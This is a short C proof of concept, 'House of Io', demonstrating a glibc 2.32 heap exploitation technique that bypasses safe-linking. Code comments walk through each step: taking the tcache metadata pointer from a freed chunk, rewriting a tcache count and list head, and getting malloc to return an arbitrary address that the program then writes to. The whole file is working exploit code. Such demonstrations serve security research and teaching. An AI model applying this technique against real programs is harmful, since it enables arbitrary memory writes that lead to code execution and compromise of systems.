/* House of Io for Malloc in Glibc 2.32 - safe-linking bypass
abstraction layer high enough to be be universal, though somewhat 
optimistic in terms of the availability of exploit primitives */

#include <stdio.h>
#include <stdlib.h>

unsigned long victim = 1;

int main()
{
        long int *a, *b, *c;

        a = malloc(20);
        b = malloc(20);
        free(b);
 
        //get the tcache metadata chunk
        //alternatively, free(*(b + 1)) to get the tcache object on a freelist
        //this would be quite common with UAF/double free in the case of free(some_struct). 
        a = *(b + 1);

        //set the tcache count to n > 1
        //we can also set this to some crazy number
        *a = 2;
        
        //get a pointer to target tc_idx
        //this is deterministic because tcache 
        //metadata chunk is an instance of its type. 
        long int *z = (char *)a + 0x80;

        //set the list head to victim 
        *z = &victim; 

        //get the victim address 
        int *v = malloc(0x15);

        //set value at victim 
        *v = 2; 
        
        printf("%d\n", victim);

        return 0;
}
